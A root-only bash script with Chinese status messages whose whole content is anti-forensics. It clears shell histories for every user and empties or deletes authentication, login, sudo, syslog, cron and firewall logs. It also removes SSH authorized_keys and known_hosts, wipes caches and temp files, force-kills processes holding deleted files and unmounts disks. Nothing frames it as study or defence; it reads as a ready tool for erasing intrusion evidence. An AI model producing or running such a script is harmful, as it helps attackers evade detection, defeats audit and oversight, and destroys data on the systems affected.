#!/bin/bash

if [[ $EUID -ne 0 ]]; then
    echo "此脚本必须以 root 权限运行" 
    exit 1
fi

echo "清理操作开始于 $(date)"

history -c
rm -f ~/.bash_history
rm -f ~/.zsh_history
rm -f ~/.bash_logout
rm -f ~/.profile
rm -f ~/.ash_history

> /var/log/auth.log
> /var/log/secure
> /var/log/messages
> /var/log/lastlog
> /var/log/wtmp
> /var/log/btmp
> /var/log/utmp
> /var/log/syslog
rm -f /var/log/*-?????
rm -f /var/log/*.[0-9]

rm -f /var/log/lastlog
rm -f /var/log/wtmp
rm -f /var/log/btmp
rm -f /var/log/utmp
rm -f /var/log/faillog

rm -f /var/log/sudo*

rm -rf /tmp/*
rm -rf /var/tmp/*
rm -rf /root/.cache
rm -rf ~/.cache

rm -f ~/.ssh/known_hosts
rm -f ~/.ssh/authorized_keys

clear

sync; echo 3 > /proc/sys/vm/drop_caches

if command -v lsof &> /dev/null; then
    lsof | grep 'deleted' | awk '{print $2}' | xargs kill -9
else
    echo "lsof 命令未找到，无法清理删除的文件句柄。"
fi

rm -f /var/crash/*

rm -rf ~/.mozilla/firefox/*.default-release/cache2
rm -rf ~/.config/google-chrome/Default/Caches

rm -f /var/log/netstat
rm -f /var/log/iptables.log

> /var/log/cron

rm -f /tmp/.X11-unix/*
rm -f /tmp/.ICE-unix/*

for user in $(cut -f1 -d: /etc/passwd); do
    rm -rf /home/$user/.cache
    rm -f /home/$user/.bash_history
    rm -f /home/$user/.zsh_history
done

# 检查设备是否挂载再卸载
for dev in /dev/sda1 /dev/sdb1; do
    if mount | grep -q "$dev"; then
        umount $dev
    fi
done


history -c
clear



